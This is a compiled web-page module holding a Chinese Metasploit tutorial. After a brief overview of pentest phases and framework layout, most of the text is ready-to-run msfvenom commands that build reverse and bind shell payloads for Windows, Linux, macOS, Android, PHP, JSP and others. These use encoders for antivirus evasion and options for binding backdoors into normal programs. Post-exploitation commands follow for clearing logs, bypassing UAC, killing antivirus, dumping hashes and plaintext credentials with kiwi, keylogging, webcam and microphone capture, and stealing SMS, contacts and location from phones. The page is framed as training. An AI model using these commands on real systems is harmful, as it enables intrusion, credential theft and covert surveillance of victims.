import{_ as l,W as p,X as i,Y as a,Z as s,a0 as r,a1 as e,C as t}from"./framework-b6a07282.js";const o={},d=e(`<h2 id="metasploit工具的使用" tabindex="-1"><a class="header-anchor" href="#metasploit工具的使用" aria-hidden="true">#</a> Metasploit工具的使用</h2><h3 id="漏洞利用流程" tabindex="-1"><a class="header-anchor" href="#漏洞利用流程" aria-hidden="true">#</a> 漏洞利用流程</h3><ol><li><p><strong>前期交互阶段</strong></p><p>与客户组织进行交互讨论，确定范围，目标等，这个阶段大家可以理解为情报收集前阶段，主要是为了找到目标 确认范围</p></li><li><p><strong>情报搜集阶段</strong> 获取更多目标组织信息，外围信息搜索如google、主机探测与端口扫描如nmap等、服务扫描如利用metasploit中的auxiliary/scanner/中的服务扫描模块，可以对靶机中的服务版本等信息进行扫描、网络漏洞扫描如nessus等</p></li><li><p><strong>威胁建模阶段</strong> 确定出最可行的漏洞利用通道，这个建模阶段写的文档不是给自己看的，是给整个团队看的，方便多人合作。 这个阶段主要是根据收集到的情报进行整理 ，理清漏洞利用思路。</p></li><li><p><strong>漏洞分析阶段</strong> 搜索可获取的渗透代码资源，这个阶段主要挑选匹配可能存在的漏洞利用模块。</p></li><li><p><strong>渗透利用阶段</strong> 找出安全漏洞，入侵系统，这个阶段尝试利用漏洞 ，配置监控，开始漏洞利用。</p></li><li><p><strong>后渗透利用阶段</strong> Meterpreter，实施操作， 这个阶段 就开始实施相关数据下载 后门维持 提权等操作</p></li><li><p><strong>报告阶段</strong> 这个阶段主要是对本次渗透进行总结，概述总体上包括 时间、人员、漏洞利用范围、技术手段等等。我们需要在这部分确定漏洞利用执行的时间范围、参与漏洞利用的人员及联系方式、约定的漏洞利用范围和一些漏洞利用过程中采用的技术、工具描述。写清 前期交互 情报搜集 威胁建模 漏洞分析 .渗透利用 后渗透利用 漏洞利用结果 安全建议 等内容</p><p>在撰写的过程中，需要特别注意的是：漏洞描述切忌不可过于简单，一笔带过；在安全建议部分避免提出没有实际意义的安全建议，比如加强安全意识；报告结构混乱不堪，太多复杂的专业术语，比如绕狗、x站等等；</p></li></ol><h3 id="msf的目录" tabindex="-1"><a class="header-anchor" href="#msf的目录" aria-hidden="true">#</a> MSF的目录</h3><p>cd /usr/share/metasploit-framework</p><p>modules：存放模块的</p><p>plugins：存放插件的</p><p>tools：存放其他工具的</p><p>scripts：存放辅助脚本的</p><p>db：存放数据库的</p><p>data：存放使用到的文件，如密码字典</p><p>lib：存放库文件的</p><p>config：存放配置文件，还有些执行文件，如：msfconsole</p><p>cd /usr/share/metasploit-framework/modules</p><p>auxiliary（辅助模块）：该模块不会直接在测试者和目标主机之间建立访问，它们只负责执行扫描、嗅探、指纹识别等相关功能以辅助渗透测试。</p><p>encoders（编码器模块）：将攻击载荷进行编码（类似与加密），让避免操作系统和杀毒软件辨认出来。</p><p>evasion（躲避模块）：该模块在渗透测试中负责免杀，以防止被杀毒软件、防火墙、IDS及类似的安全软件检测出来。</p><p>exploits（渗漏洞利用模块）：漏洞利用是指由渗透测试者利用一个系统、应用或者服务中的安全漏洞进行的攻击行为。</p><p>nops（空指令模块）：为了避免攻击载荷在执行的过程中出现随机地址和返回地址错误而在执行 shellcode 之前加入一些空指令，使得在执行 shellcode 时有一个较大的安全着陆区。</p><p>payloads（攻击载荷模块）： 攻击载荷是我们期望目标系统在被渗透攻击之后完成实际攻击功能的代码，成功渗透目标后，用于在目标系统上运行任意命令或者执行特定代码，在Metasploit框架中可以自由地选择、传送和植入。攻击载荷也可能是简单地在目标操作系统上执行一些命令，如添加用户账号等。</p><p>post（后渗透模块）：该模块主要用于在取得目标系统远程控制权后，进行一系列的后渗透攻击动作，如获取敏感信息、实施跳板攻击等。</p><h3 id="msf的常用命令" tabindex="-1"><a class="header-anchor" href="#msf的常用命令" aria-hidden="true">#</a> msf的常用命令</h3><ul><li>kail中的msfvenom取代了msfplayload和msfencode，常用于生成后门木马</li><li>msfplayload是msf攻击载荷生成器，用于生成shellcode和可执行代码。msfencode是msf编码器。</li></ul><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code><span class="token comment">#msfvenom常用参数</span>

<span class="token parameter variable">-l</span> 列出指定模块的所有可用资源，模块类型包括：payloads，encoders，nops，all

<span class="token parameter variable">-p</span> 指定需要使用的payload（攻击载荷）

<span class="token parameter variable">-f</span> 指定输出格式
Executable formats:Asp、aspx、aspx-exe、axis2、dll、elf、elf-so、exe、exe-only、exe-service、exe-smallhta-psh、jar、jsp、loop-vbs、macho、msi、msi-nouac、osx-app、psh、psh-cmd、psh-net、psh-reflection、python-reflection、vba、vba-exe、vba-psh、vbs、war；

Transform formats:base32、base64、bash、c、csharp、dw、dword、hex、java、js_be、js_le、num、perl、pl、powershell、ps1、py、python、raw、rb、ruby、sh、vbapplication、vbscript；

<span class="token parameter variable">-e</span>
指定需要使用的encoder（编码器）编码免杀。

<span class="token parameter variable">-a</span>
指定payload的目标架构

选择架构平台:x86 <span class="token operator">|</span> x64 <span class="token operator">|</span> x86_64
Platforms:windows, netware, android, java, ruby, linux, cisco, solaris, osx, bsd, openbsd, bsdi, netbsd, freebsd, aix, hpux, irix, unix, php, javascript, python, nodejs, firefox, mainframe

<span class="token parameter variable">-o</span>
保存payload文件输出。

<span class="token parameter variable">-b</span>
设定规避字符集，比如: <span class="token string">&#39;\\x00\\xff&#39;</span>避免使用的字符

<span class="token parameter variable">-n</span>
为payload预先指定一个NOP滑动长度

<span class="token parameter variable">-s</span>
设定有效攻击荷载的最大长度生成payload的最大长度，就是文件大小。

<span class="token parameter variable">-i</span>
指定payload的编码次数

<span class="token parameter variable">-c</span>
指定一个附加的win32 shellcode文件

<span class="token parameter variable">-x</span>
指定一个自定义的可执行文件作为模板
例如：原先有个正常文件normal.exe 可以通过这个选项把后门捆绑到这个程序上面。

<span class="token parameter variable">-k</span>
保护模板程序的动作，注入的payload作为一个新的进程运行
例如：原先有个正常文件normal.exe 可以通过这个选项把后门捆绑到这个程序上面。

<span class="token parameter variable">-v</span>
指定一个自定义的变量，以确定输出格式

<span class="token comment">#生成各平台payload的命令</span>
Windows
msfvenom <span class="token parameter variable">-a</span> x86 <span class="token parameter variable">--platform</span> Windows <span class="token parameter variable">-p</span> windows/meterpreter/reverse_tcp <span class="token assign-left variable">LHOST</span><span class="token operator">=</span><span class="token number">192.168</span>.1.253 <span class="token assign-left variable">LPORT</span><span class="token operator">=</span><span class="token number">8888</span> <span class="token parameter variable">-e</span> x86/shikata_ga_nai <span class="token parameter variable">-b</span> <span class="token string">&#39;\\x00\\x0a\\xff&#39;</span> <span class="token parameter variable">-i</span> <span class="token number">10</span>  <span class="token parameter variable">-f</span> exe <span class="token parameter variable">-o</span> payload.exe
msfvenom <span class="token parameter variable">-a</span> x86 <span class="token parameter variable">--platform</span> Windows <span class="token parameter variable">-p</span> windows/meterpreter/bind_tcp <span class="token assign-left variable">LPORT</span><span class="token operator">=</span><span class="token number">7777</span> <span class="token parameter variable">-e</span> x86/shikata_ga_nai <span class="token parameter variable">-b</span> <span class="token string">&#39;\\x00\\x0a\\xff&#39;</span> <span class="token parameter variable">-i</span> <span class="token number">10</span> <span class="token parameter variable">-f</span> exe <span class="token operator">&gt;</span> payload2.exe
---
Mac
msfvenom <span class="token parameter variable">-a</span> x86 <span class="token parameter variable">--platform</span> osx <span class="token parameter variable">-p</span> osx/x86/shell_reverse_tcp <span class="token assign-left variable">LHOST</span><span class="token operator">=</span><span class="token number">192.168</span>.3.33 <span class="token assign-left variable">LPORT</span><span class="token operator">=</span><span class="token number">4444</span> <span class="token parameter variable">-f</span> macho <span class="token parameter variable">-o</span> payload.macho
---
Android
msfvenom <span class="token parameter variable">-p</span> android/meterpreter/reverse_tcp <span class="token assign-left variable">LHOST</span><span class="token operator">=</span><span class="token number">192.168</span>.1.1 <span class="token assign-left variable">LPORT</span><span class="token operator">=</span><span class="token number">4567</span>  <span class="token parameter variable">-o</span> payload.apk
---
Powershell
msfvenom <span class="token parameter variable">-a</span> x86 <span class="token parameter variable">--platform</span> Windows <span class="token parameter variable">-p</span> windows/powershell_reverse_tcp <span class="token assign-left variable">LHOST</span><span class="token operator">=</span><span class="token number">192.168</span>.1.253 <span class="token assign-left variable">LPORT</span><span class="token operator">=</span><span class="token number">8888</span> <span class="token parameter variable">-e</span> cmd/powershell_base64 <span class="token parameter variable">-i</span> <span class="token number">3</span> <span class="token parameter variable">-f</span> raw <span class="token parameter variable">-o</span> payload.ps1
---
Linux
msfvenom <span class="token parameter variable">-a</span> x86 <span class="token parameter variable">--platform</span> Linux <span class="token parameter variable">-p</span> linux/x86/meterpreter/reverse_tcp <span class="token assign-left variable">LHOST</span><span class="token operator">=</span><span class="token number">192.168</span>.1.1 <span class="token assign-left variable">LPORT</span><span class="token operator">=</span><span class="token number">4567</span> <span class="token parameter variable">-f</span> elf <span class="token parameter variable">-o</span> payload.elf
---
php
msfvenom <span class="token parameter variable">-p</span> php/meterpreter/reverse_tcp <span class="token assign-left variable">lhost</span><span class="token operator">=</span><span class="token number">192.168</span>.0.142 <span class="token assign-left variable">lport</span><span class="token operator">=</span><span class="token number">4444</span> <span class="token parameter variable">-f</span> raw <span class="token operator">&gt;</span><span class="token number">1</span>.php <span class="token punctuation">(</span>这可以，但一会儿就断了<span class="token punctuation">)</span>
msfvenom <span class="token parameter variable">-p</span> php/meterpreter_reverse_tcp <span class="token assign-left variable">LHOST</span><span class="token operator">=</span><span class="token number">192.168</span>.0.142  <span class="token assign-left variable">LPORT</span><span class="token operator">=</span><span class="token number">4444</span>  <span class="token parameter variable">-f</span> raw <span class="token operator">&gt;</span> shell.php
msfvenom <span class="token parameter variable">-p</span> php/meterpreter_reverse_tcp <span class="token assign-left variable">LHOST</span><span class="token operator">=</span><span class="token number">192.168</span>.1.253  <span class="token assign-left variable">LPORT</span><span class="token operator">=</span><span class="token number">4444</span> <span class="token parameter variable">-o</span> shell.php
---
aspx
msfvenom <span class="token parameter variable">-a</span> x86 <span class="token parameter variable">--platform</span> windows <span class="token parameter variable">-p</span> windows/meterpreter/reverse_tcp <span class="token assign-left variable">LHOST</span><span class="token operator">=</span><span class="token number">192.168</span>.1.1 <span class="token assign-left variable">LPORT</span><span class="token operator">=</span><span class="token number">8888</span> <span class="token parameter variable">-f</span> aspx <span class="token parameter variable">-o</span> payload.aspx
---
JSP
msfvenom <span class="token parameter variable">--platform</span> <span class="token function">java</span> <span class="token parameter variable">-p</span> java/jsp_shell_reverse_tcp <span class="token assign-left variable">LHOST</span><span class="token operator">=</span><span class="token number">192.168</span>.110.2  <span class="token assign-left variable">LPORT</span><span class="token operator">=</span><span class="token number">4444</span> <span class="token parameter variable">-f</span> raw <span class="token parameter variable">-o</span> payload.jsp
msfvenom <span class="token parameter variable">-p</span> java/meterpreter/reverse_tcp <span class="token assign-left variable">lhost</span><span class="token operator">=</span><span class="token number">192.168</span>.110.2 <span class="token assign-left variable">lport</span><span class="token operator">=</span><span class="token number">4444</span> <span class="token parameter variable">-f</span> war <span class="token parameter variable">-o</span> test.war
---
war
msfvenom <span class="token parameter variable">-p</span> java/jsp_shell_reverse_tcp <span class="token assign-left variable">LHOST</span><span class="token operator">=</span><span class="token number">192.168</span>.1.1 <span class="token assign-left variable">LPORT</span><span class="token operator">=</span><span class="token number">4567</span> <span class="token parameter variable">-f</span> raw - o payload.war
---
nodejs
msfvenom <span class="token parameter variable">-p</span> nodejs/shell_reverse_tcp <span class="token assign-left variable">LHOST</span><span class="token operator">=</span><span class="token number">192.168</span>.1.1  <span class="token assign-left variable">LPORT</span><span class="token operator">=</span><span class="token number">4567</span> <span class="token parameter variable">-f</span> raw <span class="token parameter variable">-o</span> payload.js
---
python
msfvenom <span class="token parameter variable">-p</span> python/meterpreter/reverse_tcp <span class="token assign-left variable">LHOST</span><span class="token operator">=</span><span class="token number">192.168</span>.1.1  <span class="token assign-left variable">LPORT</span><span class="token operator">=</span><span class="token number">4567</span> <span class="token parameter variable">-f</span> raw <span class="token parameter variable">-o</span> payload.py
---
perl
msfvenom <span class="token parameter variable">-p</span> cmd/unix/reverse_perl <span class="token assign-left variable">LHOST</span><span class="token operator">=</span><span class="token number">192.168</span>.1.1  <span class="token assign-left variable">LPORT</span><span class="token operator">=</span><span class="token number">4567</span> <span class="token parameter variable">-f</span> raw <span class="token parameter variable">-o</span> payload.pl
---
ruby
msfvenom <span class="token parameter variable">-p</span> ruby/shell_reverse_tcp <span class="token assign-left variable">LHOST</span><span class="token operator">=</span><span class="token number">192.168</span>.1.1 <span class="token assign-left variable">LPORT</span><span class="token operator">=</span><span class="token number">4567</span> <span class="token parameter variable">-f</span> raw <span class="token parameter variable">-o</span> payload.rb
---
lua
msfvenom <span class="token parameter variable">-p</span> cmd/unix/reverse_lua <span class="token assign-left variable">LHOST</span><span class="token operator">=</span><span class="token number">192.168</span>.1.1 <span class="token assign-left variable">LPORT</span><span class="token operator">=</span><span class="token number">4567</span> <span class="token parameter variable">-f</span> raw <span class="token parameter variable">-o</span> payload.lua
---
windows shellcode
msfvenom <span class="token parameter variable">-a</span> x86 <span class="token parameter variable">--platform</span> Windows <span class="token parameter variable">-p</span> windows/meterpreter/reverse_tcp <span class="token assign-left variable">LHOST</span><span class="token operator">=</span><span class="token number">192.168</span>.1.1 <span class="token assign-left variable">LPORT</span><span class="token operator">=</span><span class="token number">4567</span> <span class="token parameter variable">-f</span> c
---
linux shellcode
msfvenom <span class="token parameter variable">-a</span> x86 <span class="token parameter variable">--platform</span> Linux <span class="token parameter variable">-p</span> linux/x86/meterpreter/reverse_tcp <span class="token assign-left variable">LHOST</span><span class="token operator">=</span><span class="token number">192.168</span>.1.1 <span class="token assign-left variable">LPORT</span><span class="token operator">=</span><span class="token number">4567</span> <span class="token parameter variable">-f</span> c
msfvenom <span class="token parameter variable">-a</span> x64 <span class="token parameter variable">--platform</span> linux <span class="token parameter variable">-p</span> linux/x64/meterpreter/reverse_tcp <span class="token assign-left variable">LHOST</span><span class="token operator">=</span><span class="token number">192.168</span>.136.199 <span class="token assign-left variable">LPORT</span><span class="token operator">=</span><span class="token number">4444</span> <span class="token parameter variable">-b</span> <span class="token string">&quot;<span class="token entity" title="\\x00">\\x00</span>&quot;</span> <span class="token parameter variable">-i</span> <span class="token number">10</span> <span class="token parameter variable">-f</span> elf <span class="token parameter variable">-o</span> payload
msfvenom <span class="token parameter variable">-a</span> x86 <span class="token parameter variable">--platform</span> linux <span class="token parameter variable">-p</span> linux/x86/meterpreter/reverse_tcp <span class="token assign-left variable">LHOST</span><span class="token operator">=</span><span class="token number">192.168</span>.0.114 <span class="token assign-left variable">LPORT</span><span class="token operator">=</span><span class="token number">4444</span> <span class="token parameter variable">-e</span> x86/shikata_ga_nai <span class="token parameter variable">-b</span> <span class="token string">&#39;\\x00\\x0a\\xff&#39;</span> <span class="token parameter variable">-i</span> <span class="token number">10</span>  <span class="token parameter variable">-f</span> elf <span class="token parameter variable">-o</span> payload
msfvenom <span class="token parameter variable">-p</span> linux/x64/meterpreter/bind_tcp <span class="token assign-left variable">LPORT</span><span class="token operator">=</span><span class="token number">7777</span> <span class="token parameter variable">-f</span> elf <span class="token operator">&gt;</span> <span class="token number">7777</span>.elf

---
mac shellcode
msfvenom <span class="token parameter variable">-a</span> x86 <span class="token parameter variable">--platform</span> osx <span class="token parameter variable">-p</span> osx/x86/shell_reverse_tcp  <span class="token assign-left variable">LHOST</span><span class="token operator">=</span><span class="token number">192.168</span>.1.1  <span class="token assign-left variable">LPORT</span><span class="token operator">=</span><span class="token number">4567</span> <span class="token parameter variable">-f</span> c

</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h3 id="msf后渗透" tabindex="-1"><a class="header-anchor" href="#msf后渗透" aria-hidden="true">#</a> MSF后渗透</h3><h4 id="基本常用命令" tabindex="-1"><a class="header-anchor" href="#基本常用命令" aria-hidden="true">#</a> 基本常用命令</h4><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code><span class="token builtin class-name">help</span> <span class="token comment">#查看Meterpreter帮助</span>
background <span class="token comment">#返回，把meterpreter后台挂起</span>
bgkill <span class="token comment">#杀死一个 meterpreter 脚本</span>
bglist <span class="token comment">#提供所有正在运行的后台脚本的列表</span>
bgrun <span class="token comment">#作为一个后台线程运行脚本</span>
channel <span class="token comment">#显示活动频道</span>
sessions <span class="token parameter variable">-i</span> number <span class="token comment">#与会话进行交互，number表示第n个session,使用session -i 连接到指定序号的meterpreter会话已继续利用</span>
sesssions <span class="token parameter variable">-k</span>  number <span class="token comment">#与会话进行交互</span>
close <span class="token comment">#关闭通道</span>
<span class="token builtin class-name">exit</span> <span class="token comment">#终止 meterpreter 会话</span>
quit <span class="token comment">#终止 meterpreter 会话</span>
interact <span class="token function">id</span> <span class="token comment">#切换进一个信道</span>
run <span class="token comment">#执行一个已有的模块，这里要说的是输入run后按两下tab，会列出所有的已有的脚本，常用的有autoroute,hashdump,arp_scanner,multi_meter_inject等</span>
irb <span class="token comment">#进入 Ruby 脚本模式</span>
<span class="token builtin class-name">read</span> <span class="token comment">#从通道读取数据write# 将数据写入到一个通道</span>
run和bgrun <span class="token comment">#前台和后台执行以后它选定的 meterpreter 脚本</span>
use <span class="token comment">#加载 meterpreter 的扩展</span>
load/use <span class="token comment">#加载模块</span>
Resource <span class="token comment">#执行一个已有的rc脚本</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h4 id="常用文件命令" tabindex="-1"><a class="header-anchor" href="#常用文件命令" aria-hidden="true">#</a> 常用文件命令</h4><table><thead><tr><th>描述</th><th>攻击机</th><th>被攻击机</th></tr></thead><tbody><tr><td>查看当前目录</td><td>getlwd</td><td>pwd</td></tr><tr><td>查看当前目录下的文件</td><td>lls</td><td>dir、ls</td></tr><tr><td>写文档</td><td></td><td>edit <em>文件名</em></td></tr><tr><td>切换当前路径</td><td>lcd <em>路径</em></td><td>cd <em>路径</em>、<em>盘符</em></td></tr><tr><td>上传文件</td><td>upload <em>文件名</em></td><td></td></tr><tr><td>下载文件</td><td>download <em>文件名</em></td><td></td></tr><tr><td>删除文件、文件夹</td><td></td><td>rm <em>文件名</em>、rmdir<em>文件名</em></td></tr><tr><td>搜索文件</td><td></td><td>search -h</td></tr></tbody></table><h4 id="针对windwos的命令" tabindex="-1"><a class="header-anchor" href="#针对windwos的命令" aria-hidden="true">#</a> 针对windwos的命令</h4><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code>清除日志（system权限）：clearev

查看进程：ps

查看当前进程号：getpid

查看系统信息：sysinfo

查看目标机是否为虚拟机：run post/windows/gather/checkvm

查看完整网络设置：route

查看当前权限：getuid

自动提权：getsystem
提权模块：
exploit/windows/local/bypassuac_dotnet_profiler 
exploit/windwos/local/bypassuac_windows_store_reg
exploit/windwos/local/bypassuac_sluihjack
search bypassuac慢慢试到可以的
然后再getsystem

关闭杀毒软件：run post/windows/manage/killav

启动远程桌面协议：run post/windows/manage/enable_rdp

列举当前登录的用户：run post/windows/gather/enum_logged_on_users

查看当前应用程序：run post/windows/gather/enum_applications

抓取目标机的屏幕截图：screenshot、load espia、screengrab

获取相机设备：webcam_list

控制拍照 ：webcam_snap

直播摄像头：webcam_stream

控制录音：record_mic

查看当前处于目标机的那个目录：pwd

查看当前目录：getlwd

导出当前用户密码哈希  run hashdump

用户名：SID：LM哈希：NTLM哈希:::

也可以使用下面这个命令导出 权限更高   run windows/gather/smart_hashdump

抓取自动登录的用户名和密码  run windows/gather/credentials/windows_autologin

直接获取明文密码（注意这个功能需要获取系统权限  获取系统权限需要输入getsystem）

首选终端输入  load kiwi    加载kiwi

键盘记录：keyscan_start（开始）、keyscan_dump（查看键盘记录）、keyscan_stop（关闭键盘记录）

创建用户：run getgui <span class="token parameter variable">-u</span> user1 <span class="token parameter variable">-p</span> <span class="token number">123456</span>	
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h5 id="获取账号密码" tabindex="-1"><a class="header-anchor" href="#获取账号密码" aria-hidden="true">#</a> 获取账号密码</h5><ol><li>抓取自动登录账号密码：</li></ol><p>在meterpreter视图下执行命令</p><p>如果有配置自动登录那么执行以下命令： run windows/gather/credentials/windows_autologin</p><ol start="2"><li><p>导出SAM数据库本地账户文件，（注意需要提权到SYSTEM） run post/windows/gather/smart_hashdump</p></li><li><p>导出密码哈希：run hashdump</p></li><li><p>使用kiwi模块获取：load kiwi然后再执行creds_all</p></li></ol><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code>creds_all：列举所有凭据
creds_kerberos：列举所有kerberos凭据
creds_msv：列举所有msv凭据
creds_ssp：列举所有ssp凭据
creds_tspkg：列举所有tspkg凭据
creds_wdigest：列举所有wdigest凭据
dcsync：通过DCSync检索用户帐户信息
dcsync_ntlm：通过DCSync检索用户帐户NTLM散列、SID和RID
golden_ticket_create：创建黄金票据
kerberos_ticket_list：列举kerberos票据
kerberos_ticket_purge：清除kerberos票据
kerberos_ticket_use：使用kerberos票据
kiwi_cmd：执行mimikatz的命令，后面接mimikatz.exe的命令
lsa_dump_sam：dump出lsa的SAM
lsa_dump_secrets：dump出lsa的密文
password_change：修改密码
wifi_list：列出当前用户的wifi配置文件
wifi_list_shared：列出共享wifi配置文件/编码
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h5 id="远程控制" tabindex="-1"><a class="header-anchor" href="#远程控制" aria-hidden="true">#</a> 远程控制</h5><ol><li>使用rdesktop远程控制</li></ol><ul><li>rdesktop是linux下支持windows远程桌面连接的客户端程序，在linux系统下可以通过它远程访问windwos桌面，支持多种版本。采用RDP协议，几乎可以连接windows的所有版本。</li></ul><table><thead><tr><th>参数</th><th>描述</th></tr></thead><tbody><tr><td>-u</td><td>账户名</td></tr><tr><td>-p</td><td>密码</td></tr><tr><td>-a 16</td><td>使用16位色显示远程桌面</td></tr><tr><td>-f</td><td>全屏模式（用ctrl+alt+enter组合退出全屏）</td></tr><tr><td>-g</td><td>设置分辨率如 -g 1024x768</td></tr><tr><td>rdesktop -n</td><td>查看帮助</td></tr></tbody></table><p>启用远程桌面：run post/windows/manage/enable_rdp</p><p>rdesktop -u <em>用户名</em> -p <em>密码</em> -f <em>IP地址</em></p><p>2.直接run vnc</p><h5 id="调用摄像头" tabindex="-1"><a class="header-anchor" href="#调用摄像头" aria-hidden="true">#</a> 调用摄像头</h5><ol><li>webcam模块支持命令</li></ol><table><thead><tr><th>模块名</th><th>描述</th></tr></thead><tbody><tr><td>webcam_list</td><td>列出靶机中所有软硬件摄像头列表，并编号</td></tr><tr><td>webcam_snap</td><td>可调用单个软、硬件摄像头，默认调用第一个摄像头</td></tr><tr><td>webcam_stream</td><td>可调用单个软、硬件摄像头直播，默认调用第一个摄像头</td></tr></tbody></table><ol start="2"><li>webcam_snap（拍照）</li></ol><table><thead><tr><th>模块名</th><th>描述</th></tr></thead><tbody><tr><td>-h</td><td>显示帮助</td></tr><tr><td>-i</td><td>-i 1 代表调用编号为1的摄像头</td></tr><tr><td>-p</td><td>-p /root 设置存储路径</td></tr><tr><td>-q</td><td>-q 100 ‘100’表示存储图片的质量默认为50</td></tr><tr><td>-v</td><td>-v false -v 2个参数 true和false这个参数表示拍照后自动打开，默认为true</td></tr></tbody></table><ol start="3"><li>webcam_stream（直播）</li></ol><table><thead><tr><th>参数</th><th>描述</th></tr></thead><tbody><tr><td>-h</td><td>显示帮助</td></tr><tr><td>-d</td><td>-d 100 &quot;100&quot;=100秒 设置流持续时间为100秒 默认为1800</td></tr><tr><td>-i</td><td>-i 1 “1”代表调用摄像头编号</td></tr><tr><td>-q</td><td>-q 100 “100”指流质量 默认为50</td></tr><tr><td>-s</td><td>-s live “live”指流文件路径 默认输出在当前目录（注意目录不存在不会自动创建）</td></tr><tr><td>-f</td><td>-f live “live”指播放文件的存储地址 默认输出在当前目录</td></tr><tr><td>-v</td><td>-v false -v 2个参数 true 和 false 这个参数表示拍照后自动打开,默认参数为true</td></tr></tbody></table><h4 id="针对安卓手机的命令" tabindex="-1"><a class="header-anchor" href="#针对安卓手机的命令" aria-hidden="true">#</a> 针对安卓手机的命令</h4><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code>获取手机通讯录： dump_contacts

获取短信记录：dump_sms

控制实验手机发短信：send_sms <span class="token parameter variable">-d</span> <span class="token number">15330252525</span> <span class="token parameter variable">-t</span> <span class="token string">&quot;hello&quot;</span>

获取实验手机GPS定位信息：geolocate

获取实验手机Wi-Fi定位信息：wlan_geolocate

控制实验手机录音：record_mic <span class="token parameter variable">-d</span> <span class="token number">4</span><span class="token punctuation">(</span>录制为2秒<span class="token punctuation">)</span>

获取实验手机相机设备：webcam_list

控制实验手机拍照 ：webcam_snap

直播实验手机摄像头：webcam_stream
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h3 id="auxiliary辅助模块" tabindex="-1"><a class="header-anchor" href="#auxiliary辅助模块" aria-hidden="true">#</a> Auxiliary辅助模块</h3><h4 id="auxiliary辅助模块分类" tabindex="-1"><a class="header-anchor" href="#auxiliary辅助模块分类" aria-hidden="true">#</a> Auxiliary辅助模块分类</h4><ol><li><p><strong>admin</strong> /admin/android</p><p>/admin/http</p><p>/admin/mysql/</p><p>/admin/oracle/</p><p>/admin/vmware/</p><p>/admin/smb/</p></li><li><p><strong>dos</strong> 